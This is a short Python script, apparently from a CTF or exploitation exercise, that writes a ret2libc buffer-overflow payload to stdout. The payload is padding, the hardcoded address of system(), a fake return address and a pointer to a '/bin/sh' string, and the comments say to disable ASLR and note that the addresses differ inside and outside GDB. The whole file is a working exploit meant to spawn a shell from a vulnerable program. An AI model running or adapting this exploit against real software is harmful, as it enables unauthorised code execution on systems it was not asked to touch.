import sys
# Make sure aslr is disabled, even though nothing seemed wrong in gdb
# Why doesn't it work with gets?

system_addr = "\xa0\xfd\xe2\xf7"
fake_retaddr = "DDDD"
# In GDB
sh_str_addr = "\xf8\xcb\xff\xff" # end of our entire string
# Standalone
#sh_str_addr = "\x38\xcc\xff\xff" # end of our entire string
sh_str = "/bin/sh"

sys.stdout.write("A"*0x40 + "BBBB" + system_addr + fake_retaddr + sh_str_addr + sh_str)

